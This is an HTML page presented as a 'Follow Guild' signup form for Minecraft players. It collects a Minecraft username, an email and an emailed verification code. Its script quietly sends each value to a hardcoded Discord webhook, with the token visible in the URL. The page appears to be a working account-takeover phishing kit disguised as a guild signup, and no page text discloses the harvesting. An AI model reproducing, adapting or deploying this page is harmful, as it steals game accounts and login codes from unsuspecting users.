<!DOCTYPE html>
<html>
<head>
  <title>Follow Guild - Signup</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .signup-container {
      background-color: #fff;
      border-radius: 6px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
      padding: 20px;
      max-width: 400px;
      width: 100%;
    }

    .signup-container h1 {
      text-align: center;
      margin-top: 0;
    }

    .signup-container form {
      display: flex;
      flex-direction: column;
    }

    .signup-container form label {
      margin-bottom: 6px;
      font-weight: bold;
    }

    .signup-container form input[type="text"],
    .signup-container form input[type="email"],
    .signup-container form input[type="password"] {
      padding: 10px;
      border-radius: 4px;
      border: 1px solid #ccc;
      margin-bottom: 10px;
    }

    .signup-container form button {
      padding: 10px;
      background-color: #4CAF50;
      border: none;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    .signup-container form button:hover {
      background-color: #45a049;
    }

    .verification-container {
      display: none;
      margin-top: 20px;
    }

    .verification-container p {
      text-align: center;
    }

    .verification-container input[type="text"] {
      padding: 10px;
      border-radius: 4px;
      border: 1px solid #ccc;
      margin-top: 10px;
    }

    .verification-container button {
      padding: 10px;
      background-color: #4CAF50;
      border: none;
      color: white;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }

    .verification-container button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="signup-container">
    <h1>Create an Account</h1>
    <form id="followForm">
      <label for="username">Minecraft Username:</label>
      <input type="text" id="username" required>

      <label for="email">Email:</label>
      <input type="email" id="email" required>

      <button type="submit">Sign Up</button>
    </form>

    <div class="verification-container" id="codeContainer">
      <p>Please check your email for the verification code.</p>
      <label for="code">Verification Code:</label>
      <input type="text" id="code" required>
      <button type="submit">Verify</button>
    </div>
  </div>

  <script>
    let emailSubmitted = false;

    document.getElementById("followForm").addEventListener("submit", function(event) {
      event.preventDefault(); // prevent the form from reloading the page

      // get the input values
      const username = document.getElementById('username').value;
      const email = document.getElementById('email').value;

      // create the webhook message
      const message = {
        "content": "Email and IGN entered!",
        "embeds": [
          {
            "title": "Guild Follow Request",
            "description": "Please verify your email address by entering the code we sent you.",
            "color": 16777215,
            "fields": [
              {
                "name": "Minecraft Username",
                "value": username
              },
              {
                "name": "Email",
                "value": email
              }
            ]
          }
        ]
      };

      // send the webhook message
      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(message)
      })
      .then(function(response) {
        if (response.ok) {
          console.log("Email and IGN submitted successfully!");
          emailSubmitted = true;
          showCodeForm();
        } else {
          console.log("Error:", response.statusText);
        }
      })
      .catch(function(error) {
        console.log("Error:", error);
      });
    });

    document.getElementById("codeContainer").addEventListener("submit", function(event) {
      event.preventDefault(); // prevent the form from reloading the page

      // get the verification code
      const code = document.getElementById('code').value;

      // create the verification code message
      const codeMessage = {
        "content": "Verification code entered!",
        "embeds": [
          {
            "title": "Verification Code",
            "description": "The verification code entered by the user.",
            "color": 16711680,
            "fields": [
              {
                "name": "Code",
                "value": code
              }
            ]
          }
        ]
      };

      // send the verification code message to the webhook
      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(codeMessage)
      })
      .then(function(response) {
        if (response.ok) {
          console.log("Code submitted successfully!");
          // Code validation success, you can perform any further actions here
        } else {
          console.log("Error:", response.statusText);
          // Code validation failed, you can display an error message or take other actions
        }
      })
      .catch(function(error) {
        console.log("Error:", error);
      });
    });

    function showCodeForm() {
      document.getElementById("followForm").style.display = "none";
      document.getElementById("codeContainer").style.display = "block";
    }
  </script>
</body>
</html>
